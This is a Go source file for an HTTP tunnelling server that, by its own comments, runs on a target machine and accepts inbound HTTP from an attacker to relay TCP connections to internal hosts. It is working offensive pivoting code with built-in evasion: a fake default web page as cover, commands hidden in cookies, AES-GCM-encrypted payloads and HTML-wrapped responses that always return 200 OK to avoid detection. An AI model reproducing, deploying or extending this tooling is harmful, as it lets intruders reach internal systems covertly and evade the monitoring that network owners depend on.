package httptunnel

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// Server handles HTTP requests and relays TCP connections to internal hosts.
// Runs on the TARGET machine. Accepts inbound HTTP from the attacker.
type Server struct {
	listenAddr string
	key        []byte
	path       string // URL path for tunnel endpoint (default "/b")
	secure     bool   // secure mode: AES-GCM, cookie commands, HTML wrapping
	secKeys    *SecureKeys
	sessions   sync.Map
	logger     *log.Logger
	httpServer *http.Server
}

// tcpSession tracks an individual relayed TCP connection.
type tcpSession struct {
	conn    net.Conn
	id      string
	target  string
	created time.Time
	lastUse time.Time
	mu      sync.Mutex
}

// connectResponse is returned by the connect command.
type connectResponse struct {
	SID string `json:"sid"`
}

// ServerConfig holds configuration for the HTTP tunnel server.
type ServerConfig struct {
	ListenAddr string
	Key        []byte
	Path       string
	Secure     bool // enable secure mode (AES-GCM, cookie commands, HTML wrapping)
	Logger     *log.Logger
}

// NewServer creates a new HTTP tunnel server.
func NewServer(cfg *ServerConfig) *Server {
	path := cfg.Path
	if path == "" {
		path = "/b"
	}
	logger := cfg.Logger
	if logger == nil {
		logger = log.Default()
	}

	s := &Server{
		listenAddr: cfg.ListenAddr,
		key:        cfg.Key,
		path:       path,
		secure:     cfg.Secure,
		logger:     logger,
	}

	if cfg.Secure {
		keys, err := DeriveSecureKeys(cfg.Key)
		if err != nil {
			logger.Fatalf("[tunnel-server] secure key derivation failed: %v", err)
		}
		s.secKeys = keys
	}

	return s
}

// Start begins the HTTP tunnel server. Blocks until context is cancelled.
func (s *Server) Start(ctx context.Context) error {
	mux := http.NewServeMux()
	mux.HandleFunc(s.path, s.handleTunnel)
	mux.HandleFunc("/", s.handleCover)

	s.httpServer = &http.Server{
		Addr:              s.listenAddr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}

	// Session cleanup goroutine: close idle sessions after 5 minutes
	go s.cleanupLoop(ctx)

	s.logger.Printf("[httptunnel-server] listening on %s (path: %s)", s.listenAddr, s.path)

	errCh := make(chan error, 1)
	go func() {
		errCh <- s.httpServer.ListenAndServe()
	}()

	select {
	case <-ctx.Done():
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		s.httpServer.Shutdown(shutdownCtx)
		s.closeAllSessions()
		return nil
	case err := <-errCh:
		if err == http.ErrServerClosed {
			return nil
		}
		return fmt.Errorf("httptunnel server: %w", err)
	}
}

// handleCover serves a fake HTML page on GET / for cover.
func (s *Server) handleCover(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, `<!DOCTYPE html>
<html><head><title>Welcome</title></head>
<body><h1>It works!</h1><p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added yet.</p>
</body></html>`)
}

// handleTunnel dispatches tunnel commands.
func (s *Server) handleTunnel(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		if s.secure {
			s.handleCover(w, r)
		} else {
			http.NotFound(w, r)
		}
		return
	}

	if s.secure {
		s.handleSecureTunnel(w, r)
		return
	}

	// Basic mode: authentication check
	if len(s.key) > 0 {
		token := r.Header.Get("X-Token")
		if token != AuthToken(s.key) {
			http.NotFound(w, r)
			return
		}
	}

	cmd := r.URL.Query().Get("cmd")

	switch cmd {
	case CmdConnect:
		s.handleConnect(w, r)
	case CmdSend:
		s.handleSend(w, r)
	case CmdRecv:
		s.handleRecv(w, r)
	case CmdDisconnect:
		s.handleDisconnect(w, r)
	case CmdPing:
		s.handlePing(w, r)
	default:
		http.NotFound(w, r)
	}
}

// handleSecureTunnel processes requests in secure mode.
// Commands are read from cookies, data is AES-GCM encrypted,
// responses are HTML-wrapped. Always returns 200 OK.
func (s *Server) handleSecureTunnel(w http.ResponseWriter, r *http.Request) {
	// Extract command from cookie
	cookie, err := r.Cookie(s.secKeys.CookieName)
	if err != nil {
		// No valid cookie — return cover page (looks like normal 200)
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, WrapSecureEmpty())
		return
	}

	cmd, err := DecodeSecureCommand(cookie.Value, s.secKeys.EncKey)
	if err != nil {
		s.logger.Printf("[tunnel-server-secure] decode command error: %v", err)
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, WrapSecureEmpty())
		return
	}

	switch cmd.Action {
	case ActionConnect:
		s.handleSecureConnect(w, cmd.Target)
	case ActionSend:
		s.handleSecureSend(w, r, cmd.SID)
	case ActionRecv:
		s.handleSecureRecv(w, cmd.SID)
	case ActionDisconnect:
		s.handleSecureDisconnect(w, cmd.SID)
	case ActionPing:
		s.handleSecurePing(w)
	default:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, WrapSecureEmpty())
	}
}

func (s *Server) handleSecureConnect(w http.ResponseWriter, target string) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	if target == "" {
		html, _ := WrapSecureResponse([]byte("missing target"), StatusError, s.secKeys.EncKey)
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, html)
		return
	}

	network := "tcp"
	if !strings.Contains(target, "[") {
		network = "tcp4"
	}
	conn, err := net.DialTimeout(network, target, 10*time.Second)
	if err != nil {
		s.logger.Printf("[tunnel-server-secure] connect to %s failed: %v", target, err)
		html, _ := WrapSecureResponse([]byte("connection failed"), StatusError, s.secKeys.EncKey)
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, html)
		return
	}

	sid := GenerateSessionID()
	sess := &tcpSession{
		conn:    conn,
		id:      sid,
		target:  target,
		created: time.Now(),
		lastUse: time.Now(),
	}
	s.sessions.Store(sid, sess)
	s.logger.Printf("[tunnel-server-secure] session %s: connected to %s", sid, target)

	respJSON, _ := json.Marshal(connectResponse{SID: sid})
	html, err := WrapSecureResponse(respJSON, StatusOK, s.secKeys.EncKey)
	if err != nil {
		s.logger.Printf("[tunnel-server-secure] wrap response error: %v", err)
		fmt.Fprint(w, WrapSecureEmpty())
		return
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, html)
}

func (s *Server) handleSecureSend(w http.ResponseWriter, r *http.Request, sid string) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	val, ok := s.sessions.Load(sid)
	if !ok {
		html, _ := WrapSecureResponse([]byte("session not found"), StatusError, s.secKeys.EncKey)
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, html)
		return
	}
	sess := val.(*tcpSession)

	body, err := io.ReadAll(r.Body)
	if err != nil {
		html, _ := WrapSecureResponse([]byte("read body failed"), StatusError, s.secKeys.EncKey)
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, html)
		return
	}

	data, err := DecodeSecurePayload(string(body), s.secKeys.EncKey)
	if err != nil {
		html, _ := WrapSecureResponse([]byte("decode failed"), StatusError, s.secKeys.EncKey)
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, html)
		return
	}

	sess.mu.Lock()
	sess.lastUse = time.Now()
	_, err = sess.conn.Write(data)
	sess.mu.Unlock()

	if err != nil {
		s.logger.Printf("[tunnel-server-secure] session %s: send error: %v", sid, err)
		s.removeSession(sid)
		html, _ := WrapSecureResponse([]byte("send failed"), StatusError, s.secKeys.EncKey)
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, html)
		return
	}

	html, _ := WrapSecureResponse(nil, StatusOK, s.secKeys.EncKey)
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, html)
}

func (s *Server) handleSecureRecv(w http.ResponseWriter, sid string) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	val, ok := s.sessions.Load(sid)
	if !ok {
		html, _ := WrapSecureResponse([]byte("session not found"), StatusError, s.secKeys.EncKey)
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, html)
		return
	}
	sess := val.(*tcpSession)

	sess.mu.Lock()
	sess.lastUse = time.Now()
	sess.conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
	buf := make([]byte, 32768)
	n, err := sess.conn.Read(buf)
	sess.conn.SetReadDeadline(time.Time{})
	sess.mu.Unlock()

	if n > 0 {
		html, wrapErr := WrapSecureResponse(buf[:n], StatusOK, s.secKeys.EncKey)
		if wrapErr != nil {
			fmt.Fprint(w, WrapSecureEmpty())
			return
		}
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, html)
		return
	}

	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			// No data yet — return empty
			w.WriteHeader(http.StatusOK)
			fmt.Fprint(w, WrapSecureEmpty())
			return
		}
		s.logger.Printf("[tunnel-server-secure] session %s: recv error: %v", sid, err)
		s.removeSession(sid)
		html, _ := WrapSecureResponse([]byte("recv failed"), StatusError, s.secKeys.EncKey)
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, html)
		return
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, WrapSecureEmpty())
}

func (s *Server) handleSecureDisconnect(w http.ResponseWriter, sid string) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	s.removeSession(sid)
	s.logger.Printf("[tunnel-server-secure] session %s: disconnected", sid)
	html, _ := WrapSecureResponse(nil, StatusOK, s.secKeys.EncKey)
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, html)
}

func (s *Server) handleSecurePing(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	html, _ := WrapSecureResponse([]byte("pong"), StatusOK, s.secKeys.EncKey)
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, html)
}

// handleConnect opens a TCP connection to the specified target.
func (s *Server) handleConnect(w http.ResponseWriter, r *http.Request) {
	target := r.URL.Query().Get("target")
	if target == "" {
		http.Error(w, "missing target", http.StatusBadRequest)
		return
	}

	network := "tcp"
	if !strings.Contains(target, "[") {
		network = "tcp4"
	}
	conn, err := net.DialTimeout(network, target, 10*time.Second)
	if err != nil {
		s.logger.Printf("[httptunnel-server] connect to %s failed: %v", target, err)
		http.Error(w, "connection failed", http.StatusBadGateway)
		return
	}

	sid := GenerateSessionID()
	sess := &tcpSession{
		conn:    conn,
		id:      sid,
		target:  target,
		created: time.Now(),
		lastUse: time.Now(),
	}
	s.sessions.Store(sid, sess)

	s.logger.Printf("[httptunnel-server] session %s: connected to %s", sid, target)

	resp := connectResponse{SID: sid}
	data, err := json.Marshal(resp)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	// Encrypt the response if key is set
	if len(s.key) > 0 {
		w.Header().Set("Content-Type", "application/octet-stream")
		encoded := EncodePayload(data, s.key)
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(encoded))
	} else {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write(data)
	}
}

// handleSend writes data from the HTTP request body to the TCP connection.
func (s *Server) handleSend(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.getSession(r)
	if !ok {
		http.NotFound(w, r)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read body failed", http.StatusBadRequest)
		return
	}

	var data []byte
	if len(s.key) > 0 {
		data, err = DecodePayload(string(body), s.key)
		if err != nil {
			http.Error(w, "decode failed", http.StatusBadRequest)
			return
		}
	} else {
		data = body
	}

	sess.mu.Lock()
	sess.lastUse = time.Now()
	_, err = sess.conn.Write(data)
	sess.mu.Unlock()

	if err != nil {
		s.logger.Printf("[httptunnel-server] session %s: send error: %v", sess.id, err)
		s.removeSession(sess.id)
		http.Error(w, "send failed", http.StatusBadGateway)
		return
	}

	w.WriteHeader(http.StatusOK)
}

// handleRecv reads data from the TCP connection and returns it in the response.
func (s *Server) handleRecv(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.getSession(r)
	if !ok {
		http.NotFound(w, r)
		return
	}

	sess.mu.Lock()
	sess.lastUse = time.Now()
	// Use short read deadline for non-blocking behavior
	sess.conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
	buf := make([]byte, 32768)
	n, err := sess.conn.Read(buf)
	sess.conn.SetReadDeadline(time.Time{}) // Clear deadline
	sess.mu.Unlock()

	if n > 0 {
		data := buf[:n]
		if len(s.key) > 0 {
			encoded := EncodePayload(data, s.key)
			w.Header().Set("Content-Type", "application/octet-stream")
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(encoded))
		} else {
			w.Header().Set("Content-Type", "application/octet-stream")
			w.WriteHeader(http.StatusOK)
			w.Write(data)
		}
		return
	}

	if err != nil {
		// Timeout is expected (no data available yet)
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			w.WriteHeader(http.StatusOK)
			return
		}
		// Real error: connection closed or broken
		s.logger.Printf("[httptunnel-server] session %s: recv error: %v", sess.id, err)
		s.removeSession(sess.id)
		http.Error(w, "recv failed", http.StatusBadGateway)
		return
	}

	// n == 0, no error (shouldn't happen but handle gracefully)
	w.WriteHeader(http.StatusOK)
}

// handleDisconnect closes the TCP connection and removes the session.
func (s *Server) handleDisconnect(w http.ResponseWriter, r *http.Request) {
	sid := r.URL.Query().Get("sid")
	if sid == "" {
		http.NotFound(w, r)
		return
	}

	s.removeSession(sid)
	s.logger.Printf("[httptunnel-server] session %s: disconnected", sid)
	w.WriteHeader(http.StatusOK)
}

// handlePing responds to keepalive checks.
func (s *Server) handlePing(w http.ResponseWriter, _ *http.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("pong"))
}

// getSession retrieves a session by the "sid" query parameter.
func (s *Server) getSession(r *http.Request) (*tcpSession, bool) {
	sid := r.URL.Query().Get("sid")
	if sid == "" {
		return nil, false
	}
	val, ok := s.sessions.Load(sid)
	if !ok {
		return nil, false
	}
	return val.(*tcpSession), true
}

// removeSession closes and removes a session by ID.
func (s *Server) removeSession(sid string) {
	val, ok := s.sessions.LoadAndDelete(sid)
	if ok {
		sess := val.(*tcpSession)
		sess.mu.Lock()
		sess.conn.Close()
		sess.mu.Unlock()
	}
}

// closeAllSessions closes all active TCP sessions.
func (s *Server) closeAllSessions() {
	s.sessions.Range(func(key, value any) bool {
		sess := value.(*tcpSession)
		sess.mu.Lock()
		sess.conn.Close()
		sess.mu.Unlock()
		s.sessions.Delete(key)
		return true
	})
}

// cleanupLoop periodically removes idle sessions (>5 minutes).
func (s *Server) cleanupLoop(ctx context.Context) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			s.cleanupIdleSessions()
		}
	}
}

// cleanupIdleSessions removes sessions idle for more than 5 minutes.
func (s *Server) cleanupIdleSessions() {
	now := time.Now()
	s.sessions.Range(func(key, value any) bool {
		sess := value.(*tcpSession)
		sess.mu.Lock()
		idle := now.Sub(sess.lastUse)
		sess.mu.Unlock()
		if idle > 5*time.Minute {
			s.logger.Printf("[httptunnel-server] session %s: idle timeout, closing", sess.id)
			s.removeSession(sess.id)
		}
		return true
	})
}
